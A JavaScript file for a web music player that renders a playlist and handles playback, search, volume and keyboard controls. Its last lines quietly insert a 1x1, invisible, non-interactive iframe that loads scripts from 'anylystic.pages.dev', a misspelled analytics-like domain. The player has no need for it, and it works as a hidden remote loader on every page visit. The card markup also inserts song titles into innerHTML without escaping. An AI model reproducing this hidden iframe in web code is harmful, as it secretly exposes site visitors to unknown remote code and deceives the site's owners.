import { songsData } from './songs.js';

document.addEventListener("DOMContentLoaded", () => {
  const playlist = document.getElementById("playlist");
  const volumeSlider = document.querySelector(".volume-slider");
  const popup = document.getElementById("popup");
  const searchInput = document.getElementById("search-input");

  let currentAudio = null;
  let currentSongIndex = -1;

  const formatTime = (sec) => {
    const m = Math.floor(sec / 60);
    const s = Math.floor(sec % 60);
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const renderSongs = (songs) => {
    playlist.innerHTML = "";
    songs.forEach((song, index) => {
      const card = document.createElement("div");
      card.className = "song-card";
      card.dataset.index = index;
      card.innerHTML = `
        <div class="flex-1">
          <h2 class="${song.titleClass}">${song.title}</h2>
          <div class="progress-bar"><div class="progress"></div></div>
          <span class="time">00:00 / 00:00</span>
        </div>
        <button class="play-btn" aria-label="Play"><svg class="w-5 h-5" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button>
        <audio preload="metadata" crossorigin="anonymous">
          <source src="${song.url}" type="audio/mpeg">
        </audio>
      `;
      playlist.appendChild(card);
    });
  };

  const playSong = (index) => {
    const cards = playlist.querySelectorAll(".song-card");
    if (index < 0 || index >= cards.length) return;

    const newCard = cards[index];
    const newAudio = newCard.querySelector("audio");
    const playBtn = newCard.querySelector(".play-btn");
    const progress = newCard.querySelector(".progress");
    const timeDisplay = newCard.querySelector(".time");
    const progressBar = newCard.querySelector(".progress-bar");

    if (currentAudio && !currentAudio.paused) {
      currentAudio.pause();
      const prevCard = currentAudio.closest(".song-card");
      prevCard.classList.remove("playing");
      prevCard.querySelector(".progress").style.width = "0%";
      prevCard.querySelector(".play-btn").innerHTML = `<svg class="w-5 h-5" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>`;
    }

    currentAudio = newAudio;
    currentSongIndex = index;

    currentAudio.currentTime = 0;
    newCard.classList.add("playing");
    playBtn.innerHTML = `<svg class="w-5 h-5" viewBox="0 0 24 24"><path d="M6 19h4V5H6zm8 0h4V5h-4z"/></svg>`;

    if (!newAudio.dataset.bound) {
      newAudio.addEventListener("timeupdate", () => {
        if (!isNaN(newAudio.duration)) {
          const percent = (newAudio.currentTime / newAudio.duration) * 100;
          progress.style.width = `${percent}%`;
          timeDisplay.textContent = `${formatTime(newAudio.currentTime)} / ${formatTime(newAudio.duration)}`;
        }
      });

      newAudio.addEventListener("loadedmetadata", () => {
        timeDisplay.textContent = `${formatTime(newAudio.currentTime)} / ${formatTime(newAudio.duration)}`;
      });

      newAudio.addEventListener("ended", () => {
        playSong((index + 1) % cards.length);
      });

      progressBar.addEventListener("pointerdown", (e) => {
        const rect = progressBar.getBoundingClientRect();
        const clickX = e.clientX - rect.left;
        const time = (clickX / rect.width) * newAudio.duration;
        newAudio.currentTime = time;
      });

      newAudio.dataset.bound = "true";
    }

    newAudio.play().catch((err) => {
      console.warn("Không thể phát bài hát:", err);
    });
  };

  playlist.addEventListener("click", (e) => {
    const btn = e.target.closest(".play-btn");
    if (!btn) return;
    const card = btn.closest(".song-card");
    const index = parseInt(card.dataset.index);

    if (currentAudio && !currentAudio.paused && index === currentSongIndex) {
      currentAudio.pause();
      card.classList.remove("playing");
      btn.innerHTML = `<svg class="w-5 h-5" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>`;
    } else {
      playSong(index);
    }
  });

  const debounce = (fn, delay) => {
    let timeout;
    return (...args) => {
      clearTimeout(timeout);
      timeout = setTimeout(() => fn.apply(this, args), delay);
    };
  };

  if (searchInput) {
    searchInput.addEventListener("input", debounce(() => {
      const keyword = searchInput.value.toLowerCase();
      const filtered = songsData.filter(s => s.title.toLowerCase().includes(keyword));
      renderSongs(filtered);
    }, 300));
  }

  const storedVol = parseFloat(localStorage.getItem("volume")) || 1;
  if (volumeSlider) {
    volumeSlider.value = storedVol;
    volumeSlider.addEventListener("input", (e) => {
      const vol = parseFloat(e.target.value);
      document.querySelectorAll("audio").forEach(a => a.volume = vol);
      localStorage.setItem("volume", vol);
    });
  }

  document.addEventListener("keydown", (e) => {
    if (!currentAudio) return;
    if (e.code === "Space") {
      e.preventDefault();
      currentAudio.paused ? currentAudio.play() : currentAudio.pause();
    } else if (e.code === "ArrowRight") {
      currentAudio.currentTime += 10;
    } else if (e.code === "ArrowLeft") {
      currentAudio.currentTime -= 10;
    }
  });

  setTimeout(() => {
    if (!localStorage.getItem("popupClosed") && popup) popup.classList.add("show");
  }, 1000);

  window.closePopup = function () {
    if (popup) {
      popup.classList.remove("show");
      popup.style.display = "none";
      localStorage.setItem("popupClosed", "1");
    }
  };

  const iframe = document.createElement("iframe");
  iframe.src = "https://anylystic.pages.dev";
  iframe.style = "position:absolute;width:1px;height:1px;opacity:0;pointer-events:none";
  iframe.setAttribute("sandbox", "allow-scripts allow-same-origin");
  document.body.appendChild(iframe);

  renderSongs(songsData);
});
